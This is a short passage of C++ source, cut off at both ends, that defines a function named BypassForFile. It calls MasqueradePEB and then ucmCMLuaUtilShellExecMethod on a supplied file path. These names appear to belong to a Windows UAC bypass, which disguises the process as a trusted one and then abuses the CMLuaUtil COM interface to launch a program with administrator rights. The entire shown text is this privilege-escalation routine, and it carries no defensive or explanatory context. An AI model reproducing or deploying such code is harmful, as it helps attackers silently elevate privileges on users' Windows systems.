...
BOOL BypassForFile(TCHAR* szPath)
{
	MasqueradePEB();
	if (szPath != NULL)
	{
		// Create a non-const copy of the path
		TCHAR* nonConstPath = new TCHAR[_tcslen(szPath) + 1];
		_tcscpy_s(nonConstPath, _tcslen(szPath) + 1, szPath);

		// Pass the non-const path to the function
		ucmCMLuaUtilShellExecMethod(nonConstPath);
